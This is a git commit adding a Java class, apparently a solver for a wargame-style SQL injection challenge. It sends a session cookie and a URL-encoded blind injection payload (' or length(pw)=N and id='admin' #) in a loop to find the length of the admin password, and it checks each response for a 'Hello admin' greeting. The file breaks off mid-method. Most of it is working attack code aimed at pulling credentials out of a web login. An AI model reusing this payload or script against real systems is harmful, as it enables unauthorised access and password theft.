dc8e38ed38db73360d2e0599deead68e222b5974
se-hyun Hwang <imscs21@naver.com>
2016-12-29 13:05:59 +0900

    Create BaseClass.java

---
+++ BaseClass.java
@@ -0,0 +1,80 @@
+import java.io.*;
+import java.util.*;
+public class BaseClass{
+public HttpURLConnection conn=null;
+public static String getContent(InputStream ism) throws IOException{
+		StringBuffer sb = new StringBuffer();
+		//BufferedReader br = new BufferedReader(new BufferedInputStream(ism));
+		DataInputStream dis = new DataInputStream(ism);
+		String l;
+		while((l=dis.readLine())!=null){
+			sb.append(l);
+		}
+		dis.close();
+
+		final String result = sb.toString();
+		sb=null;
+		return result;
+	}
+
+	public String queryContent(Configure conf,String cookie_content,String sub_query) throws Exception{
+		conn =(HttpURLConnection) new URL(conf.getURL()+sub_query).openConnection();
+		//conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G930S Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.0 Chrome/44.0.2403.133 Mobile Safari/537.36");
+		conn.addRequestProperty("Cookie",cookie_content);
+		conn.connect();
+		InputStream ism = conn.getInputStream();
+		final String content = getContent(ism);
+		ism.close();
+		conn.disconnect();
+		conn=null;
+		return content;
+	}
+	public boolean isSuccess(String resp,String[] acclst){
+		boolean rst = false;
+		for(String acc:acclst){
+			rst = rst||resp.contains("<h2>Hello "+acc);
+			if(rst){
+				break;
+			}
+		}
+		return rst;
+	}
+	public boolean isSuccess(String resp){
+		return isSuccess(resp,new String[]{"guest","Guest","Admin","admin"});
+	}
+protected void saveListOnFile(File f,int pos,ArrayList<String> lst) throws Exception{
+		OutputStream osm = new FileOutputStream(f);
+		ObjectOutputStream dos = new ObjectOutputStream(osm);
+		dos.writeInt(pos);
+		dos.flush();
+		dos.writeObject(lst);
+		dos.flush();
+		dos.close();
+		osm.close();
+	}
+	public void run(){
+		Configure conf = new Configure();
+		if(conf.getToken().equals("exit")){
+			return;
+		}
+
+		try{
+			final String cookie_content = "PHPSESSID="+conf.getToken()+";";
+			int pwlen=-1;
+			String content="";
+			int lenhelper = 40;
+			while(pwlen==-1){
+				String sub_query = "?"+String.format("pw=%%27%%20or%%20length(pw)=%d%%20%s%%23",lenhelper,URLEncoder.encode(" and id='admin' "));
+				content=queryContent(conf,cookie_content,sub_query);
+				
+				if(isSuccess(content)){
+					pwlen=(lenhelper);
+					pwlen=lenhelper;
+					
+				}
+				else{
+					lenhelper++;
+				}
+			}
+
+}
